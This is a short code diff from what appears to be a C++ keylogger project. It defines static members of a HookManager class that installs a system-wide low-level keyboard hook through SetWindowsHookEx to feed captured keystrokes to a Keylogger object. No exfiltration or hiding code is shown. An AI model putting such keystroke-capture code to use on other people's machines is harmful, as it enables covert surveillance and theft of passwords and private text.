@@ -1,6 +1,9 @@
 #include "../../include/hook_manager.h"
 #include "../../include/keylogger.h"
 
+HHOOK HookManager::_hook = nullptr;
+Keylogger* HookManager::_keylogger = nullptr;
+
 void HookManager::InstallKeyboardHook(Keylogger* keylogger) {
     _keylogger = keylogger;
     HHOOK hookHandle = SetWindowsHookEx(WH_KEYBOARD_LL, ListenerHookCallback, NULL, 0);
@@ -25,6 +28,7 @@ LRESULT __stdcall HookManager::ListenerHookCallback(int nCode, WPARAM wParam, LP
 void HookManager::ReleaseHook() {
     UnhookWindowsHookEx(_hook);
 }
+
 
 void HookManager::displayErrorMessage() {
     LPCWSTR errorMessage = L"Failed to install hook!";
